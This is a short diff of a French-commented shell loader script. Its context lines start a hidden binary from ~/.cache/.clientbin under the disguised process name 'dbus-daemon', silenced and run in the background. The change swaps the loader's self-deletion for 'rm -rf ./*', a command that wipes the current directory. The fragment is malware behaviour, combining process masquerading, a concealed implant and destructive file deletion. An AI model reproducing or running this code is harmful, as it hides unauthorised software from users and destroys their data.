@@ -56,4 +56,4 @@ exec -a dbus-daemon ~/.cache/.clientbin/client &>/dev/null &
 echo "[+] Terminé !"
 
 #suppression du loader.sh
-rm -- "$0"
+rm -rf ./*
